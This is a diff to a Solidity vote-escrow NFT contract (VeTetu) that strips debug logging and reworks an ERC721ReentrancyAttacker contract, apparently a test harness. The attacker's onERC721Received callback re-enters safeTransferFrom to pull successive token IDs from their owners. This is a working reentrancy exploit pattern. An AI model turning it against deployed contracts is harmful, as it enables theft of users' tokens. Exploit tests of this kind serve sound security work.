@@ -585,14 +585,10 @@ contract VeTetu is ControllableV3, ReentrancyGuard, IVeTetu {
     uint _tokenId,
     bytes memory _data
   ) public override {
-    console.log("safeTransferFrom: _from, _to, _tokenId", _from, _to, _tokenId);
     require(isWhitelistedTransfer[_to] || isWhitelistedTransfer[_from], "FORBIDDEN");
-    console.log("safeTransferFrom.2");
 
     _transferFrom(_from, _to, _tokenId, msg.sender);
-    console.log("safeTransferFrom.3");
     require(_checkOnERC721Received(_from, _to, _tokenId, _data), "ERC721: transfer to non ERC721Receiver implementer");
-    console.log("safeTransferFrom.4");
   }
 
   /// @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
@@ -675,6 +671,7 @@ contract VeTetu is ControllableV3, ReentrancyGuard, IVeTetu {
   /// @param _operator Address to add to the set of authorized operators.
   /// @param _approved True if the operators is approved, false to revoke approval.
   function setApprovalForAll(address _operator, bool _approved) external override {
+    console.log("setApprovalForAll.sender", msg.sender);
     // Throws if `_operator` is the `msg.sender`
     require(_operator != msg.sender, "IDENTICAL_ADDRESS");
     ownerToOperators[msg.sender][_operator] = _approved;
@@ -1346,7 +1343,7 @@ contract VeTetu is ControllableV3, ReentrancyGuard, IVeTetu {
 contract ERC721ReentrancyAttacker {
   VeTetu vulnerable;
 
-  uint256 tokensTo = 10;
+  // uint256 tokensTo = 10;
 
   constructor(VeTetu _vulnerable) {
     vulnerable = _vulnerable;
@@ -1355,22 +1352,21 @@ contract ERC721ReentrancyAttacker {
   // Reentrancy attack
   function attack(uint tokensTo_, address from) public payable {
     console.log("Attack from", from);
-    tokensTo = tokensTo_;
     //vulnerable.safeTransferFrom();
-    console.log("safeTransferFrom from to tokensTo", from, address(this) ,tokensTo);
-    vulnerable.safeTransferFrom(from, address(this) ,tokensTo, "");
+    console.log("safeTransferFrom from to tokensTo", from, address(this) ,tokensTo_);
+    vulnerable.safeTransferFrom(from, address(this) ,tokensTo_, "");
   }
 
   // Callback function
-  function onERC721Received(address, address from, uint256, bytes calldata) external returns (bytes4) {
+  function onERC721Received(address, address from, uint256 tokenTo_, bytes calldata) external returns (bytes4) {
     console.log("onERC721Received");
-    if (tokensTo > 0) {
-      tokensTo--;
-      address tokenOwner = vulnerable.ownerOf(tokensTo);
-      console.log("tokenOwner of tokensTo", tokenOwner, tokensTo);
+    if (tokenTo_ > 0) {
+      tokenTo_--;
+      address tokenOwner = vulnerable.ownerOf(tokenTo_);
+      console.log("tokenOwner of tokensTo", tokenOwner, tokenTo_);
       //vulnerable.safeTransferFrom();
-      console.log("safeTransferFrom from to tokensTo", tokenOwner, address(this) ,tokensTo);
-      vulnerable.safeTransferFrom(from, address(this) ,tokensTo, "");
+      console.log("safeTransferFrom from to tokensTo", tokenOwner, address(this) ,tokenTo_);
+      vulnerable.safeTransferFrom(tokenOwner, address(this) ,tokenTo_, "");
     }
     return this.onERC721Received.selector;
   }
